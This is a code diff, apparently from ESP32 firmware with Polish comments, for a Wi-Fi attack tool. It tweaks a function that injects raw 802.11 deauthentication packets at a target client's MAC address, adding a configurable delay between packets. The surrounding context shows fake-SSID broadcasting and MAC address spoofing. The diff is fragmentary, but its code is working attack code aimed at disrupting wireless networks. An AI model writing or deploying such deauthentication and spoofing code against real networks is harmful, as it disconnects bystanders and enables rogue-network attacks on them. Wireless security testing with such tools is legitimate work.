@@ -182,7 +182,7 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
 }
 
 // Funkcja wysyłająca pakiety deauth do danego klienta
-bool send_deauth_packets(String &client_mac_str, int count) {
+bool send_deauth_packets(String &client_mac_str, int count, int delay_ms) {
   logMessage("Deauth inited on target: "+ client_mac_str);
   uint8_t client_mac[6];
   
@@ -207,7 +207,7 @@ bool send_deauth_packets(String &client_mac_str, int count) {
   esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
   if (result == ESP_OK) {
     logMessage("Packet sent successfully.");
-    delay(150);
+    delay(delay_ms); // Delay between packets
   } else {
     logMessage("Error sending packet.");
   }
@@ -286,14 +286,19 @@ void add_client(uint8_t *mac) {
 }
 
 void setMac(uint8_t new_mac[6]) {
-  memcpy(target_mac, new_mac, 6);  // Kopiowanie nowego adresu MAC do target_mac
+    if (!new_mac) {
+        logMessage("Error: new_mac is NULL!");
+        return;
+    }
+    memcpy(target_mac, new_mac, 6);
 
-  logMessage("Target MAC ustawiony na: ");
-  for (int i = 0; i < 6; i++) {
-    Serial.printf("%02X", target_mac[i]);
-    if (i < 5) logMessage(":");
-  }
+    logMessage("Target MAC ustawiony na: ");
+    for (int i = 0; i < 6; i++) {
+        Serial.printf("%02X", target_mac[i]);
+        if (i < 5) logMessage(":");
+    }
 }
+
 
 bool set_mac_address(uint8_t new_mac[6]) {
   esp_err_t result = esp_wifi_set_mac(WIFI_IF_STA, new_mac);  // Ustawienie MAC dla interfejsu stacji (WIFI_STA)
